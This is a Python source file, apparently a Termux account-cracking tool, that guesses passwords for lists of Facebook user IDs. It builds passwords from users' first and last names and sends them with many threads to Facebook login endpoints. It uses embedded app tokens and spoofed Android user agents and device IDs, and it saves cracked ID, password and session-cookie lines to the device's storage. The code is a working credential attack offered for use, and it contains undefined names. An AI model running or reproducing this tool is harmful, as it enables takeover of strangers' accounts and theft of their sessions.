import os,zlib
 
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('Loading Modules ...\n')
 
 
 
try:
    import requests 
except ImportError:
    print('\n  Installing Requests ...\n')
    os.system('pip install requests')
 
 
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
 
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
 
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as krishna
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
 
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
 
import random
import string
 
 
 
#models ="""""".splitlines()
models=requests.get("https://raw.githubusercontent.com/mogid458/0/main/Devices.txt").text.splitlines()
 
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randomChoices(input_list, n):
    random_items = random.sample(input_list, n)
    result_string = ''.join(random_items) # You can change the delimiter as needed
    return result_string
 
def randBuildLSB():
    vchrome = str(random.randint(100,425))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/160.1.80.24.874;FBBV/4214829694;FBDM/{density=2.5,width=780,height=1920};FBLC/ca_MY;FBRV/4214899694;FBCR/1030;FBMF/Oppo;FBBD/Itel;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/7;FBOP/5;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
 
def randFBAN():
  VAPP = random.randint(400000000,499999999)
  ua="[FBAN/FB4A;FBAV/1727.3.0.74.284;FBBV/"+str(VAPP)+";FBDM/{density=2.1,width=780,height=1920};FBLC/ko_PT;FBRV/"+str(VAPP)+";FBCR/Docomo;FBMF/Itel LTD;FBBD/Docomo;FBPN/com.facebook.katana;FBDV/"+random.choice(models)+";FBSV/6;FBOP/5;FBCA/arm64-v8a:;]"
  return ua
 
def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/358923683;FBAV/291.0.0.12.110;FBDV/SM-T885ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
 
networks = ["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
def generate_FBAN():
  android_version=random.randint(5,15)
  device=random.choice(models)
  FBAV=f"{random.randint(180,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
  FBBV=random.randint(100000000,999999999)
  FBCR=random.choice(networks)
  
  ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=980}"+f";FBLC/fi_ID;FBRV/0;FBCR/{FBCR};FBMF/Vivo;FBBD/Kindle;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/5;FBCA/x64:arm-v8a;]"
  return ua
  
 
 
def generate_device_dalvik():
  android_version=random.randint(3,14)
  device=random.choice(models)
  Build=f"RP1A.{randomChoices(string.digits,6)}.{randomChoices(string.digits,3)}"
  ua=f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{Build})"
  return ua
 
sys.stdout.write('\x1b]2; KRISHNA\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo =                                          """\033[1;94m
  ____________36936936936936936
____________36936936936936936
____________369369369369369369
___________36936936936936933693
__________3693693693693693693693
_________369369369369369369369369
_________3693693693693693693693699
________3693693693693693693693699369
_______36936939693693693693693693693693
_____3693693693693693693693693693693636936
___36936936936936936936936936936___369369369
__36936___369336936369369369369________36936
_36936___36936_369369336936936
36933___36936__36936___369363.        ______________________________
693____36936__36936_____369363        𝗖𝗼𝗽𝘆-𝗮𝗻𝗱-𝗣𝗮𝘀𝘁𝗲 𝘄𝗮𝘀.                     
______36936__36936______369369.         𝗽𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗲𝗱 𝗯𝘆 𝗽𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗲𝗿𝘀      
_____36936___36936_______36936.         𝗳𝗼𝗿 𝗽𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗲𝗿𝘀 𝗮𝗰𝘁𝘂𝗮𝗹𝗹𝘆.            
_____36936___36936________36936.        ______________________________
_____36936___36936_________36936.            • 𝙅𝘼𝙔 𝙉𝙀𝙋𝘼𝙇🇳🇵  
______369____36936__________369___11,       
______________369________________11,
YOU KNOW WHO I AM ∆
 ╔╗╔═╦═══╦══╦═══╦╗─╔╦═╗─╔╦═══╗
║║║╔╣╔═╗╠╣╠╣╔═╗║║─║║║╚╗║║╔═╗║
║╚╝╝║╚═╝║║║║╚══╣╚═╝║╔╗╚╝║║─║║
║╔╗║║╔╗╔╝║║╚══╗║╔═╗║║╚╗║║╚═╝║
║║║╚╣║║╚╦╣╠╣╚═╝║║─║║║─║║║╔═╗║
╚╝╚═╩╝╚═╩══╩═══╩╝─╚╩╝─╚═╩╝─╚╝
                                                
                                                                                             
  © \033[3;96mKrishna R. Chhetri
  github : \033[3;92KKrishna777\033[3;96m
  Version : \033[3;92mTesting
  \033[0;1m """
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print("───────────────────────────────────")
        print('\033[1;96m Crack Complete \033[0;1m')
        print(' OK > %s' % str(len(oks)))
        print(' CP > %s' % str(len(cps)))
        print("───────────────────────────────────")
        input(" Press enter to back KRISHNA Menu ")
        exit()
 
def mogid():   
    os.system('clear')
    print(logo)
    print(f' (1) File Crack')
    print(f' (F) Join me on Facebook ')
    print('')
    select = input(' Select Menu > ')
    if select =='1':
        method_crack()
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/thebalen/')
    else:
        print('\n ($) Select valid option ... ')
        time.sleep(2)
        KRISHNA(allkey)
        
def method_crack():
    global methods
    clear()
    print(f' (1) Method {1}')
    print(f' (2) Method {2}')
    print(f' (3) Method {3}')
    #print(f'[4] Method {4}')
    print(f' (0) Back')
    print('')
    option = input(' Select method > ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    #elif option =='4':
        #methods.append('methodB')
        #main_crack().crack(id)
    elif option =='0':
        mogid()
    else:
      print('\n ($) Select Valid Option ...')
      time.sleep(0.6)
      method_crack()
 
 
 
"""
----------[ APP ID AND TOKEN ]---------- 
Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae
Instagram Web : 1217981644879628|65a937f07619e8d4dce239c462a447ce
Instagram Android : 567067343352427|f249176f09e26ce54212b472dbab8fa8
 
----------[ HOST ]----------
b-graph.facebook.com
graph.facebook.com
 
----------[ URL ]----------
 
b-graph.facebook.com
graph.facebook.com
 
"""
 
class main_crack():
    def __init__(self):
        self.id=[]
        self.blocked="\033[1;92m"
    def crack(self,id):
        global methods
        clear()
        self.file = input(' Put File Name > ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
    
    def check_block(self,response):
      response=str(response)
      if "Calls to this api have" in response or "The action attempted has been" in response:
        self.blocked="\033[1;91m"
        sys.exit(a )
      else:
        self.blocked="\033[1;92m"
    
    
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}(KRISHNA {self.blocked}•\033[0;1m \033[1;96m{loop}{S}) M1 >> \033[1;92m{len(oks)}\033[0;1m - \033[1;91m{len(cps)}\033[0;1m << {'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    adid=str(uuid.uuid4())
                    did=str(uuid.uuid4())
                    data = {"adid": adid,
"format": "json",
"device_id": did,
"cpl": "true",
"enroll_misauth": "false",
"family_device_id": did,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
"encrypted_msisdn": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "fi_ID",
"client_country_code": "FI",
"try_num":"1",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"flow": "CONTROLLER_INITIALIZATION",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                #print(data)
                headers = {'User-Agent':generate_FBAN(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'b-graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ_yNNBgbwC;pid=Main;tid=145;nc=1;fc=0;bc=0;cid=d29d67e37eca387482a8a5b740f84f62',
'x-fb-device-group': '6420',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                #print(q)
                self.check_block(q)
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);mktb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={mktb};{ckkk}"
                    print(f"\r{R} [KRISHNA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KRISHNA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MKT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [KRISHNA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/KRISHNA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        #except Exception as err:print(err)
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.methodA(sid, name, ps)
         
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}(KRISHNA {self.blocked}•\033[0;1m \033[1;96m{loop}{S}) M3 >> \033[1;92m{len(oks)}\033[0;1m - \033[1;91m{len(cps)}\033[0;1m << {'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    adid=str(uuid.uuid4())
                    did=str(uuid.uuid4())
                    data = {"adid": adid,
"format": "json",
"device_id": did,
"cpl": "true",
"family_device_id": did,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "es_LA",
"client_country_code": "MY",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildLSB(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                self.check_block(q)
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);mktb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={mktb};{ckkk}"
                    print(f"\r{R} [KRISHNA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KRISHNA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MKT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [KRISHNA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/MKT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.methodC(sid, name, ps)
           
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}(MKT {self.blocked}•\033[0;1m \033[1;96m{loop}{S}) M2 >> \033[1;92m{len(oks)}\033[0;1m - \033[1;91m{len(cps)}\033[0;1m << {'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = randBuildLSB()
                getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 4; LM-S763T ES Build/JTSM7Z; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.8279.372 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/143.0.0.27.92;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [KRISHNA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KRISHNA_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [KRISHNA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/KRISHNA_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except Exception as err:print(err)
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print(' Put limit between 1 to 15')
            sl = int(input(' How many password do you want to add?\nSelect >  '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,name,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 15')
            elif sl > 20:
                print('\n Password limit Should Not Be Greater Than 15')
            else:
                for sr in range(sl):
                    pw.append(input(f' Password {sr+1} > '))
            os.system("clear")
            print(logo)
            
            print(f"\r\033[3;96m Use flight (aeroplane) mode before use {S}\033[0;1m")
            print("───────────────────────────────────")
            print(f'{S} Total ID >> %s ' % len(self.id))
            print(f'{S} <Cracking Started>')
            print("───────────────────────────────────")
            with mogidmkt(max_workers=30) as mktworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                mktworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                mktworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                mktworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                mktworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
